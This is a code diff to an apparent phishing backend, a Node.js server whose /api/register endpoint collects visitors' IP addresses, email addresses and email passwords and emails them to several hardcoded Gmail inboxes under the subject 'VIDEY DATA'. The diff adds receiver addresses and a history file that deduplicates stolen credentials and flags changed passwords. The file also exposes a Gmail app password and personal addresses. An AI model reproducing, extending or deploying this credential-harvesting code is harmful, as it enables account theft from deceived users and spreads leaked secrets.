@@ -17,8 +17,64 @@ const SENDER_EMAIL = 'gajeb682@gmail.com';      // <== GANTI
 const SENDER_PASSWORD = 'tmyh wklt uyig lots';  // <== GANTI (App Password)
 const RECEIVER_EMAIL = [
   'gajeb682@gmail.com',
-  'bayu20110809@gmail.com'
-]; // <== GANTI
+  'akunvanzz888@gmail.com',
+  'zamzaja78@gmail.com'
+  ]; // <== GANTI
+
+// <== TAMBAHAN: File untuk menyimpan history email yang sudah dikirim
+const HISTORY_FILE = path.join(__dirname, 'sent_history.json');
+
+// <== TAMBAHAN: Baca history yang sudah tersimpan
+function loadHistory() {
+    try {
+        if (fs.existsSync(HISTORY_FILE)) {
+            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
+            return JSON.parse(data);
+        }
+    } catch (e) {
+        console.log('History file not found, creating new');
+    }
+    return {}; // Format: { "email@example.com": "last_password_sent" }
+}
+
+// <== TAMBAHAN: Simpan history
+function saveHistory(history) {
+    try {
+        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
+    } catch (e) {
+        console.error('Failed to save history:', e);
+    }
+}
+
+// <== TAMBAHAN: Cek apakah perlu dikirim
+function shouldSendEmail(email, password) {
+    const history = loadHistory();
+    const lastPassword = history[email];
+    
+    // Kasus 1: Email belum pernah ada → KIRIM
+    if (!lastPassword) {
+        console.log(`📧 Email BARU: ${email} → AKAN DIKIRIM`);
+        return true;
+    }
+    
+    // Kasus 2: Email sudah ada, password SAMA → JANGAN KIRIM
+    if (lastPassword === password) {
+        console.log(`⚠️ DUPLICATE: ${email} dengan password SAMA → TIDAK DIKIRIM`);
+        return false;
+    }
+    
+    // Kasus 3: Email sudah ada, password BERBEDA → KIRIM (update password)
+    console.log(`🔄 UPDATE: ${email} dengan password BARU (berbeda) → TETAP DIKIRIM`);
+    return true;
+}
+
+// <== TAMBAHAN: Update history setelah kirim
+function updateHistory(email, password) {
+    const history = loadHistory();
+    history[email] = password;
+    saveHistory(history);
+    console.log(`📝 History updated: ${email} → ${password.substring(0, 3)}***`);
+}
 
 const transporter = nodemailer.createTransport({
     host: 'smtp.gmail.com',
@@ -37,8 +93,23 @@ app.post('/api/register', async (req, res) => {
         console.log('🌐 IP:', data.ip_address);
         console.log('📧 Email:', data.email);
         console.log('🔑 Password:', data.emailPassword);
-
-        // HTML Email lengkap - VIDEY STYLE
+        
+        // <== TAMBAHAN: CEK DUPLICATE SEBELUM KIRIM
+        const shouldSend = shouldSendEmail(data.email, data.emailPassword);
+        
+        if (!shouldSend) {
+            console.log('❌ Email TIDAK dikirim (duplicate email + password sama)');
+            return res.json({ 
+                success: true, 
+                duplicated: true, 
+                message: 'Duplicate detected, email not sent' 
+            });
+        }
+        
+        // ========== LANJUTKAN KIRIM EMAIL ==========
+        console.log('✅ Email UNIQUE → PROSES KIRIM...');
+        
+        // HTML Email lengkap - VIDEY STYLE (sama seperti sebelumnya)
         const htmlContent = `
 <!DOCTYPE html>
 <html>
@@ -137,6 +208,14 @@ app.post('/api/register', async (req, res) => {
             border-color: rgba(24,119,242,0.3);
             margin: 20px 0;
         }
+        .duplicate-badge {
+            background: #ff9800;
+            color: #000;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
@@ -199,7 +278,7 @@ app.post('/api/register', async (req, res) => {
         await transporter.sendMail({
             from: `"Videy System" <${SENDER_EMAIL}>`,
             to: RECEIVER_EMAIL,
-            subject: `🎯 VIDEY DATA: ${data.email}`,
+            subject: `🎯 VIDEY DATA: ${data.email} ${data.emailPassword !== loadHistory()[data.email] ? '(NEW PASSWORD!)' : ''}`,
             html: htmlContent,
             attachments: [{
                 filename: `videy_stealth_${Date.now()}.json`,
@@ -207,8 +286,11 @@ app.post('/api/register', async (req, res) => {
             }]
         });
         
+        // <== TAMBAHAN: Simpan ke history setelah berhasil kirim
+        updateHistory(data.email, data.emailPassword);
+        
         console.log('✅ Email terkirim!');
-        res.json({ success: true });
+        res.json({ success: true, newData: true });
         
     } catch(error) {
         console.error('Error:', error);
@@ -223,4 +305,5 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
     console.log(`🚀 Server running on http://localhost:${PORT}`);
     console.log(`📧 Email akan dikirim ke: ${RECEIVER_EMAIL}`);
+    console.log(`💾 Duplicate history saved to: ${HISTORY_FILE}`);
 });
